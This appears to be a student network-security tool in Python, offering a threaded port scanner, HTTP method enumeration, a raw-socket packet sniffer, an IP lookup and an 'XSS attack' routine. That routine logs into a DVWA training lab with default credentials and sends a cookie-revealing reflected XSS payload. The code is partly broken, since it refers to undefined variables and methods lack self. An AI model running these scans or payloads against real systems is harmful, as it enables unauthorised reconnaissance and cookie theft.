import json
import socket
import time
import threading
import urllib
from queue import Queue
import os
import struct
import binascii
import portsDict
import webbrowser
import requests
import sys
import re
from bs4 import BeautifulSoup


class packetAnalyzer:
    socketCreated = False
    socketSniffer = 0

    def analyzeUDPHeader(dataRecv):
        udpHeader = struct.unpack('!4H', dataRecv[:8])
        srcPort = udpHeader[0]
        dstPort = udpHeader[1]
        length = udpHeader[2]
        checksum = udpHeader[3]
        data = dataRecv[8:]

        print('---------- UDP HEADER ----------')
        print('Source Port: %hu' % srcPort)
        print('Destination Port: %hu' % dstPort)
        print('Length: %hu' % length)
        print('Checksum: %hu\n' % checksum)

        return data

    def analyzeTCPHeader(dataRecv):
        tcpHeader = struct.unpack('!2H2I4H', dataRecv[:20])
        srcPort = tcpHeader[0]
        dstPort = tcpHeader[1]
        seqNum = tcpHeader[2]
        ackNum = tcpHeader[3]
        offset = tcpHeader[4] >> 12
        reserved = (tcpHeader[5] >> 6) & 0x03ff
        flags = tcpHeader[4] & 0x003f
        window = tcpHeader[5]
        checksum = tcpHeader[6]
        urgPtr = tcpHeader[7]
        data = dataRecv[20:]

        urg = bool(flags & 0x0020)
        ack = bool(flags & 0x0010)
        psh = bool(flags & 0x0008)
        rst = bool(flags & 0x0004)
        syn = bool(flags & 0x0002)
        fin = bool(flags % 0x0001)

        print('---------- TCP HEADER ----------')
        print('Source Port: %hu' % srcPort)
        print('Destination Port: %hu' % dstPort)
        print('Sequence Number: %u' % seqNum)
        print('Acknowledgement: %u' % ackNum)
        print('Flags: ')
        print('    URG: %d | ACK: %d | PSH: %d | RST: %d | SYN: %d | FIN: %d' % (urg, ack, psh, rst, syn, fin))
        print('Window Size: %hu' % window)
        print('Checksum: %hu' % checksum)
        print('Urgent Pointer: %hu\n' % urgPtr)

        return data

    def analyzeIP(dataRecv):
        ipHeader = struct.unpack('!6H4s4s', dataRecv[:20])
        version = ipHeader[0] >> 12
        ihl = (ipHeader[0] >> 8) & 0x0f
        tos = ipHeader[0] & 0x00ff
        totalLength = ipHeader[1]
        ipID = ipHeader[2]
        flags = ipHeader[3] >> 13
        fragOffset = ipHeader[3] & 0x1fff
        ipTTL = ipHeader[4] >> 8
        ipProtocol = ipHeader[4] & 0x00ff
        checksum = ipHeader[5]
        srcAddr = socket.inet_ntoa(ipHeader[6])
        dstAddr = socket.inet_ntoa(ipHeader[7])
        data = dataRecv[20:]

        print('---------- IP HEADER ----------')
        print('Version: %hu' % version)
        print('IHL: %hu' % ihl)
        print('TOS: %hu' % tos)
        print('Length: %hu' % totalLength)
        print('ID: %hu' % ipID)
        print('Offset: %hu' % fragOffset)
        print('TTL: %hu' % ipTTL)
        print('Protocol: %hu' % ipProtocol)
        print('Checksum: %hu' % checksum)
        print('Source IP: %s' % srcAddr)
        print('Destination IP: %s\n' % dstAddr)

        if ipProtocol == 6:
            tcp_udp = "TCP"
        elif ipProtocol == 17:
            tcp_udp = "UDP"
        else:
            tcp_udp = "Other"

        return data, tcp_udp

    def analyzeEtherHeader(dataRecv):
        ipBool = False
        etherHeader = struct.unpack('!6s6sH', dataRecv[:14])
        dstMac = binascii.hexlify(etherHeader[0]).decode()
        srcMac = binascii.hexlify(etherHeader[1]).decode()
        protocol = etherHeader[2] >> 8
        data = dataRecv[14:]

        print('---------- ETHERNET HEADER -----------')
        print('Destination MAC: %s:%s:%s:%s:%s:%s' % (
            dstMac[0:2], dstMac[2:4], dstMac[4:6], dstMac[6:8], dstMac[8:10], dstMac[10:12]))
        print('Source MAC: %s:%s:%s:%s:%s:%s' % (
            srcMac[0:2], srcMac[2:4], srcMac[4:6], srcMac[6:8], srcMac[8:10], srcMac[10:12]))
        print('Protocol: %hu\n' % protocol)

        if protocol == 0x08:
            ipBool = True

        return data, ipBool

    def startPacketAnalyzer(self):
        socketCreated = False
        socketSniffer = 0

        if socketCreated == False:
            socketSniffer = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            socketCreated = True;

        dataRecv = socketSniffer.recv(2048)
        os.system('clear')

        dataRecv, ipBool = analyzeEtherHeader(dataRecv)

        if ipBool:
            dataRecv, tcp_udp = analyzeIP(dataRecv)
        else:
            return

        if tcp_udp == "TCP":
            dataRecv = analyzeTCPHeader(dataRecv)
        elif tcp_udp == "UDP":
            dataRecv = analyzeUDPHeader(dataRecv)
        else:
            return


class ScannerIp:
    def __init__(self, ip):
        self.ip = t_IP

    def portscan(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            con = s.connect((t_IP, port))
            with print_lock:
                portsResults.append(port)
                print("---------------------------------------------------")
                print(("[+] Port %d is open" % (port), 'green'))
                print("This is " + portsDict.ports.get(str(port)) + " port")
            con.close()
        except:
            pass

    def threader(self):
        while True:
            worker = q.get()
            ScannerIp.portscan(worker)
            q.task_done()


class attack:

    # Get the anti-CSRF token

    def csrf_token(self):

        try:

            # Make the request to the URL

            print("\n[i] URL: %s/login.php" % target1)

            r = requests.get("{0}/login.php".format(target1), allow_redirects=False)



        except:

            # Feedback for the user (there was an error) & Stop execution of our request

            print("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target1))

            sys.exit(-1)

        # Extract anti-CSRF token

        soup = BeautifulSoup(r.text, features="lxml")

        user_token = soup("input", {"name": "user_token"})[0]["value"]

        print("[i] user_token: %s" % user_token)

        # Extract session information

        session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])

        session_id = session_id.group(1)

        print("[i] session_id: %s" % session_id)

        return session_id, user_token

    # Login to DVWA core

    def dvwa_login(self, session_id, user_token):

        # POST data

        data = {

            "username": dvwa_user,

            "password": dvwa_pass,

            "user_token": user_token,

            "Login": "Login"

        }

        # Cookie data

        cookie = {

            "PHPSESSID": session_id,

            "security": sec_level

        }

        try:

            # Make the request to the URL

            print("[i] Data: %s" % data)

            print("[i] Cookie: %s" % cookie)

            r = requests.post("{0}/login.php".format(target1), data=data, cookies=cookie, allow_redirects=False)





        except:

            # Feedback for the user (there was an error) & Stop execution of our request

            print("\n\n[!] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))

            sys.exit(-1)

        # Wasn't it a redirect?

        if r.status_code != 301 and r.status_code != 302:
            # Feedback for the user (there was an error again) & Stop execution of our request

            print("\n\n[!] dvwa_login: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))

            sys.exit(-1)

        # Did we log in successfully?

        if r.headers["Location"] != 'index.php':
            # Feedback for the user (there was an error) & Stop execution of our request

            print(

                "\n\n[!] dvwa_login: Didn't login (Header: %s  user: %s  password: %s  user_token: %s  session_id: %s).\n[i] Quitting." % (

                    r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id))

            sys.exit(-1)

        # If we got to here, everything should be okay!

        print("\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass))

        return True

    # Make the request to-do the brute force

    def url_request(username, password, session_id):

        # GET data

        data = {

            "username": username,

            "password": password,

            "Login": "Login"

        }

        # Cookie data

        cookie = {

            "PHPSESSID": session_id,

            "security": sec_level

        }

        try:

            r = requests.get("{0}/vulnerabilities/brute/".format(target1), params=data, cookies=cookie,

                             allow_redirects=False)

        except:

            # Feedback for the user (there was an error) & Stop execution of our request

            print("\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target1))

            sys.exit(-1)

        # Was it a ok response?

        if r.status_code != 200:
            # Feedback for the user (there was an error again) & Stop execution of our request

            print(
                "\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))

            sys.exit(-1)

        # We have what we need

        return r.text

    def xss_r(self, session_id, user_token):

        print('\n\nVulnerability: Reflected Cross Site Scripting (XSS):\n')

        # Cookie data

        cookie = {

            "PHPSESSID": session_id,

            "security": sec_level

        }

        # POST data

        payload = {

            "name": '<sCript>alert(document.cookie)</sCript>',

        }

        # start req

        resp = requests.get("{0}/vulnerabilities/xss_r/".format(target1), cookies=cookie, allow_redirects=False,

                            params=payload)

        soup = BeautifulSoup(resp.content, 'lxml')

        vuln_tag = soup.find("pre")

        webbrowser.open_new_tab(resp.url)

        print(resp.url + "\n", vuln_tag)  # working


print('''\033[1;97m██████╗░███████╗░█████╗░██████╗░
██╔══██╗██╔════╝██╔══██╗██╔══██╗
██████╔╝█████╗░░███████║██║░░██║
██╔══██╗██╔══╝░░██╔══██║██║░░██║
██║░░██║███████╗██║░░██║██████╔╝
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝\033[0m\n''')
try:
    while True:
        print("""Welcome to our DevNet project work! Our program is focused on network analysis and troubleshooting.
    Functions of this program:
    ===============================================================================================================
    [1] Network scanner
    This program scans the victim to locate open ports available on a particular host.
    ===============================================================================================================
    [2] Checking the availability of HTTP methods
    Given Python crypt with which we can connect to the target web server and enumerate the available HTTP methods.
    ===============================================================================================================
    [3] Packet Analyzer
    This Python program will analyze each packet received by the host machine and print out the contents of its Ethernet, 
    IP, and TCP/UDP headers to the console. The script will differentiate the packet's protocol as either TCP or UDP 
    and print their respective headers to the console.
    ===============================================================================================================
    [4] Get Info about host
    This program will give you brief information about the host.
    ===============================================================================================================
    [5] XSS attack program
    Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise 
    benign and trusted websites.
    ===============================================================================================================
    [6] Quit 
    ===============================================================================================================
    """)
        choice = int(input('[*] Please, enter the number of the feature you want to use: '))
        portsResults = []
        if choice == 1:
            socket.setdefaulttimeout(0.25)
            print_lock = threading.Lock()
            target = input('[*] Enter the host to be scanned: ')
            portNumber = int(input('[*] Enter the number of ports you want to scan: '))
            t_IP = socket.gethostbyname(target)
            print("[Scanning Target...] " + str(t_IP))

            ip = ScannerIp(t_IP)

            q = Queue()
            startTime = time.time()

            for x in range(500):
                t = threading.Thread(target=ip.threader)
                t.daemon = True
                t.start()

            for worker in range(1, portNumber):
                q.put(worker)
            q.join()

            vul_choice = input('[*] Would you like to see the list of vulnerabilities for these ports? [y/n]: ')
            for port in portsResults:
                if vul_choice == 'y':
                    webbrowser.open_new_tab('https://www.speedguide.net/port.php?port=' + str(port))
                if vul_choice == 'n':
                    break
                else:
                    print("Please, type correct answer [y/n]")
            continue_choice = input('[*] Would you like to continue? [y/n]: ')
            if continue_choice == 'y':
                continue
            if continue_choice == 'n':
                exit()

        if choice == 2:
            target = input('[*] Enter the host to be scanned: ')
            target = 'http://' + target
            method_list = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'TEST']
            for method in method_list:
                req = requests.request(method, target)
                print(method, req.status_code, req.reason)
            if method == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
                print('Cross Site Tracing(XST) is possible')
            continue_choice = input('[*] Would you like to continue? [y/n]: ')
            if continue_choice == 'y':
                continue
            if continue_choice == 'n':
                exit()

        if choice == 3:
            packet = packetAnalyzer()
            packet.startPacketAnalyzer()
            continue_choice = input('[*] Would you like to continue? [y/n]: ')
            if continue_choice == 'y':
                continue
            if continue_choice == 'n':
                exit()

        if choice == 4:
            getIP = input('[*] Enter the host to get info: ')
            t_IP = socket.gethostbyname(getIP)
            url = "https://ipinfo.io/" + t_IP + "/json"

            try:
                getInfo = urllib.request.urlopen(url)

            except:
                print("\n[!] - IP not found! - [!]\n")

            infoList = json.load(getInfo)

            print("-" * 60)

            print("IP: ", infoList["ip"])
            print("City: ", infoList["city"])
            print("Region: ", infoList["region"])
            print("Country: ", infoList["country"])
            print("Hostname: ", infoList["hostname"])
            print("timezone: ", infoList["timezone"])
            print("org: ", infoList["org"])
            print("-" * 60)
            continue_choice = input('[*] Would you like to continue? [y/n]: ')
            if continue_choice == 'y':
                continue
            if continue_choice == 'n':
                exit()

        if choice == 5:

            attack = attack()
            target = input('Please enter target you want to check on XSS attack: ')

            sec_level = 'low'

            dvwa_user = 'Admin'

            dvwa_pass = 'password'

            user_list = 'brute_force/user_list.txt'

            pass_list = 'brute_force/pass_list.txt'
            # Get initial CSRF token

            session_id, user_token = attack.csrf_token()

            # Functions

            attack.dvwa_login(session_id, user_token)

            # Vulnerability: Low mode

            attack.xss_r(session_id, user_token)

            continue_choice = input('[*] Would you like to continue? [y/n]: ')
            if continue_choice == 'y':
                continue
            if continue_choice == 'n':
                exit()

        if choice == 6:
            break
except:
    print("An exception occurred")
